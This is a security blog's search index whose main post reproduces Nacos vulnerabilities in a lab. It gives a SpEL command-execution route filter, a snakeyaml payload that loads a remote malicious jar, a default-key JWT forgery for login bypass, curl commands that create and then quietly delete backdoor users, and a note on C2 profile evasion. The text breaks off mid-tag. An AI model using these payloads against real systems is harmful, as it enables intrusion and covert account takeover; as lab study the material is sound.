<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Windows凭证理论</title>
    <link href="/2024/02/10/Windows%E5%87%AD%E8%AF%81%E7%90%86%E8%AE%BA/"/>
    <url>/2024/02/10/Windows%E5%87%AD%E8%AF%81%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="3a692bb337dae799fc30c7199324ce2e10eddb7c1a68a2705514f1f406af482c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>private</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active Directory的利用</title>
    <link href="/2024/02/05/Active-Directory%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/2024/02/05/Active-Directory%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="27e80c5ecebb30f57bcb9fb566c84fa601ac795a71b152b478fce91db6c32922"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>private</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSecNotes-初识CommonsCollections</title>
    <link href="/2024/01/18/JavaSecNotes-%E5%88%9D%E8%AF%86CommonsCollections/"/>
    <url>/2024/01/18/JavaSecNotes-%E5%88%9D%E8%AF%86CommonsCollections/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="1dd7d8e80ece3ca1719eba745562d8822347573a6b3a08c8c94a3697a7129db1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>private</tag>
      
      <tag>Java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C2基础设施搭建</title>
    <link href="/2023/11/24/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/11/24/C2%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="1-C2侧写"><a href="#1-C2侧写" class="headerlink" title="1. C2侧写"></a>1. C2侧写</h3><p>Cobalt Strike 支持自定义侧写。自定义侧写不仅可以让我们自定义 Beacon 与 Team Server 之间的通信方式，从网络通信层面实现混淆效果，还可以自定义 <strong>Beacon 行为特征，例如反射DLL拓展、进程注入设置、后利用选项等</strong>。Malleable C2 仓库(<a href="https://github.com/rsmudge/Malleable-C2-Profiles)%E6%95%B4%E5%90%88%E4%BA%86%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84">https://github.com/rsmudge/Malleable-C2-Profiles)整合了一系列的</a> C2 侧写 ，但是考虑到这个仓库是公开的，侧写中的通信模式被标记也是显然的事情。因此，如果用于实战中，我们需要对这些侧写进行二次修改甚至完全重写。</p><p>接下来，我们选择一个较为简单的 C2 侧写文件 <strong>webbug.profile</strong> 作为案例，简要分析 HTTP 协议下的流量特征。HTTPS 监听器相比 HTTP 监听器，增加了 TLS 层对通信的加密，但其他是相似的。值得一提的是，如果在实战过程中更换 C2 侧写，可能会丢失目前的所有 Beacon，这是理所当然的，因为通信模式都改变了。</p>]]></content>
    
    
    <categories>
      
      <category>红队行动</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队行动</tag>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>外部侦查</title>
    <link href="/2023/11/18/%E5%A4%96%E9%83%A8%E4%BE%A6%E6%9F%A5/"/>
    <url>/2023/11/18/%E5%A4%96%E9%83%A8%E4%BE%A6%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="1-目标站点与子域名"><a href="#1-目标站点与子域名" class="headerlink" title="1. 目标站点与子域名"></a>1. 目标站点与子域名</h3><h4 id="目标站点"><a href="#目标站点" class="headerlink" title="目标站点"></a>目标站点</h4><p>对于目标站点一开始时无需主动扫描，可以多利用被动侦查去了解所需要的信息</p><p>从黑暗引擎中（shodan、hunter、fofa等）也可以获取到很多信息</p><p><img src="/./assets/image-20231118204424182.png" alt="image-20231118204424182"></p><p>可以从dns返回信息，不同的DNS服务器可能返回不同的结果</p><p><img src="/./assets/image-20231118204200614.png" alt="image-20231118204200614"></p><p>whois信息</p><p><img src="/./assets/image-20231118204535281.png" alt="image-20231118204535281"></p><h4 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h4><p>对于企业来说，他们自己可能都不清楚自己有多少子域名，对于那些不常被关照的子域名，往往可能就是最脆弱的地方</p><p><strong>Sublist3r</strong></p><p>老牌子域名工具，从各个搜索引擎中搜集子域名</p><h3 id="2-公开服务"><a href="#2-公开服务" class="headerlink" title="2. 公开服务"></a>2. 公开服务</h3><p>需关注高危服务，例如RDP，FTP或者VPN、邮件服务器等。</p>]]></content>
    
    
    <categories>
      
      <category>红队行动</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队行动</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacos相关漏洞复现</title>
    <link href="/2023/05/29/Nacos%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/Nacos%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>这里用到的是<code>B0rn2d</code>师傅的<a href="https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos">环境</a>，后续的很多关于RCE的利用也是参考他的文章。</p><p>实际上就是引入Nacos依赖，连接到Nacos服务。</p><p>Nacos可以在Github直接下载Release版本：<a href="https://github.com/alibaba/nacos/releases/tag/2.1.0%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%E8%BF%90">https://github.com/alibaba/nacos/releases/tag/2.1.0，解压后运</a> 行 <code>sh startup.sh -m standalone</code>，访问 localhost:8848&#x2F;nacos 即可使用默认密码nacos&#x2F;nacos登录。</p><p>所有环境都在jdk1.8下运行，不然可能有莫名的报错</p><p>运行存在漏洞的Gateway项目，在项目的配置文件bootstrap.yml中，配置了连接Nacos的关键项</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529111823007.png" alt="image-20230529111823007"></p><p>其中<code>spring.cloud.nacos.config</code>下，name代表的是要在nacos中创建的配置文件的DataID，file-extension则是nacos中所创建的配置文件的格式，group则代表nacos中配置文件对应的组，而server-addr则是nacos的访问地址。</p><p>在nacos中创建对应的配置文件如下：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112324543.png" alt="image-20230529112324543"></p><p>如果运行正常，则spring-cloud-gateway项目会从nacos中动态的去获取这个配置文件，然后将内容进行即时的更新，运行项目后，可以在nacos中的监听查询功能检查是否正常连接</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112138895.png" alt="image-20230529112138895"></p><p>通过配置一条简单的路由，来测试运行效果，在刚才创建的配置文件中，点击修改配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">exam</span><br>          <span class="hljs-attr">order:</span> <span class="hljs-number">0</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://service-provider</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/echo/**</span><br></code></pre></td></tr></table></figure><p>发布后，gateway应用会成功刷新配置，此时若访问&#x2F;echo&#x2F;**路径，则nacos会将请求转发到service-provider中</p><p>这里请求报503是正常的，因为找不到这个路由</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112941641.png" alt="image-20230529112941641"></p><p>至此环境就配置通了。</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h3><p>如果拿到了一个<code>Nacos</code>权限，如何进行利用呢？</p><h4 id="Nacos配合ActuatorRCE"><a href="#Nacos配合ActuatorRCE" class="headerlink" title="Nacos配合ActuatorRCE"></a>Nacos配合ActuatorRCE</h4><p>进入nacos管理页面，翻阅配置，寻找<code>Spring Cloud Gateway</code>相关的配置，监听的服务器基本可以确定运行了<code>Spring Cloud Gateway</code>的服务器，可以在配置文件的更多中点击监听查询：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120523013.png" alt="image-20230529120523013"></p><p>就可以直接看到监听的服务器了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120549748.png" alt="image-20230529120549748"></p><p>如果应用注册到了服务中的话，那么通过服务详情里的IP，再对比上面监听查询中的IP，就可以定位到监听某个配置文件的应用的具体端口了</p><p>如果打进了内网，发现<code>Nacos</code>的时候，就可以用这个方法定位内网中的其他应用，接下来就是找<code>Spring Cloud Gateway</code>应用以及它的Nacos配置文件，和利用<code>CVE-2022-22947</code>来进行攻击</p><p>回到之前的配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改，改为以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">exam</span><br>          <span class="hljs-attr">order:</span> <span class="hljs-number">0</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://service-provider</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/echo/**</span><br>          <span class="hljs-attr">filters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">AddResponseHeader</span><br>              <span class="hljs-attr">args:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">result</span><br>                <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>这里增加了一个filters字段，并写入POC，但这里需要注意的坑有两点：</p><ol><li>需要修改原POC，将字符串输入结果使用replace()将\n以及\r符号替换为空，否则会提示报错Header中不能包含该字符导致利用失败</li><li>在YAML配置文件中，SpEL表达式必须要用双引号括起来，但POC原本就带有双引号，会导致识别冲突，所以将POC内所有的双引号改为单引号，外面在用双引号括起来</li></ol><p>完成后对配置文件进行发布，然后尝试访问<code>http://127.0.0.1:8888/echo/123</code>，发现成功回显了命令执行的结果：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495-20230529151140940.png" alt="image-20230529151053495"></p><h4 id="snakeyaml反序列化攻击"><a href="#snakeyaml反序列化攻击" class="headerlink" title="snakeyaml反序列化攻击"></a>snakeyaml反序列化攻击</h4><p>payload:（EvilScript.java）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngine;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineFactory;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> threedr3am</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilScript</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ScriptEngineFactory</span> &#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilScript</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;touch /tmp/pwn&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEngineName</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEngineVersion</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getExtensions</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getMimeTypes</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNames</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLanguageName</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLanguageVersion</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getParameter</span><span class="hljs-params">(String key)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethodCallSyntax</span><span class="hljs-params">(String obj, String m, String... args)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getOutputStatement</span><span class="hljs-params">(String toDisplay)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProgram</span><span class="hljs-params">(String... statements)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> ScriptEngine <span class="hljs-title function_">getScriptEngine</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译并且打包成jar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac EvilScript.java<br><span class="hljs-built_in">mkdir</span> -p META-INF/services/<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;EvilScript&#x27;</span> &gt; META-INF/services/javax.script.ScriptEngineFactory<br>jar -cvf EvilScript.jar EvilScript.class META-INF<br></code></pre></td></tr></table></figure><p>启一个http文件服务器</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>/EvilScript.jar<br></code></pre></td></tr></table></figure><p>绕过认证后，去修改yaml配置文件</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">server:<br>  port: <span class="hljs-number">8080</span><br>evil: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[<br>!!java.net.URL [<span class="hljs-string">&quot;http://127.0.0.1:80/EvilScript.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure><h3 id="3-登录绕过"><a href="#3-登录绕过" class="headerlink" title="3. 登录绕过"></a>3. 登录绕过</h3><p>对于<code>nacos</code>，如果默认的弱口令无法进入后台，在低版本下还存在其他的绕过方式</p><h4 id="CNVD-2023-17316"><a href="#CNVD-2023-17316" class="headerlink" title="CNVD-2023-17316"></a>CNVD-2023-17316</h4><p>先讲讲如何简单复现这个漏洞</p><p>这里我选择偷懒，拿之前在实战的报告当数据包和截图了</p><ol><li>生成JWT token</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">header :</span><br>&#123;<br>  <span class="hljs-attr">&quot;alg&quot;:</span> <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-attr">&quot;typ&quot;:</span> <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><span class="hljs-attr">payload:</span> <br>&#123;<br>  <span class="hljs-attr">&quot;sub&quot;:</span> <span class="hljs-string">&quot;nacos&quot;</span>,<br>  <span class="hljs-attr">&quot;exp&quot;:</span> <span class="hljs-number">1684393327</span>    <span class="hljs-string">//</span> <span class="hljs-string">时间戳，比这个大就会返回正确token</span><br>&#125;<br><span class="hljs-attr">VERIFY SIGNATURE:</span> <span class="hljs-string">HMACSHA256(</span><br>  <span class="hljs-string">base64UrlEncode(header)</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-string">+</span><br>  <span class="hljs-string">base64UrlEncode(payload),</span><br><span class="hljs-string">SecretKey012345678901234567890123456789012345678901234567890123456789</span><br><span class="hljs-string">)</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122624187.png" alt="image-20230529122624187"></p><ol start="2"><li>构造数据包</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /nacos/v1/auth/users/login <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8848</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Length</span>: <span class="hljs-number">32</span><br><span class="hljs-title class_">Accept</span>: application/json, text/plain, *<span class="hljs-comment">/*</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Origin: http://127.0.0.1:8848</span><br><span class="hljs-comment">Referer: http://127.0.0.1:8848/nacos/</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4NDM5MzMyN30.OOTD_TIinawZvdgxRTg8BpIqEdE3gZhahxN9Ql0gaWs</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">username=admin&amp;password=admin123</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122805001.png" alt="image-20230529122805001"></p><p>burp抓包后修改Authorization的token值就可以直接进后台了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123116428.png" alt="image-20230529123116428"></p><h4 id="CVE-2021-29441-x2F-CVE-2021-29442"><a href="#CVE-2021-29441-x2F-CVE-2021-29442" class="headerlink" title="CVE-2021-29441&#x2F;CVE-2021-29442"></a>CVE-2021-29441&#x2F;CVE-2021-29442</h4><p>poc:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># CVE-2021-29441 创建用户</span><br>curl -XPOST <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users?username=test&amp;password=test&#x27;</span><br><span class="hljs-comment"># CVE-2021-29442 bypass 1.4.1</span><br>curl XGET <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123245307.png" alt="image-20230529123245307"></p><p>这里就直接以test账号登录了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123320571.png" alt="image-20230529123320571"></p><p>当然对于这个poc有一个问题就是留痕了</p><p>在xray的poc中我发现可以通过delete方法删除掉这个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -XDELETE <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users?username=test&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="hljs-attr">manual:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">transport:</span> <span class="hljs-string">http</span><br><span class="hljs-attr">set:</span><br>    <span class="hljs-attr">r1:</span> <span class="hljs-string">randomLowercase(16)</span><br>    <span class="hljs-attr">r2:</span> <span class="hljs-string">randomLowercase(16)</span><br><span class="hljs-attr">rules:</span><br>    <span class="hljs-attr">r0:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>            <span class="hljs-comment"># 增加了 bypass 的方式</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/nacos/v1/auth/users/?username=&#123;&#123;r1&#125;&#125;&amp;password=&#123;&#123;r2&#125;&#125;</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">response.status</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">response.body.bcontains(bytes(&quot;create</span> <span class="hljs-string">user</span> <span class="hljs-string">ok!&quot;))</span><br>    <span class="hljs-attr">r1:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">GET</span><br>            <span class="hljs-attr">path:</span> <span 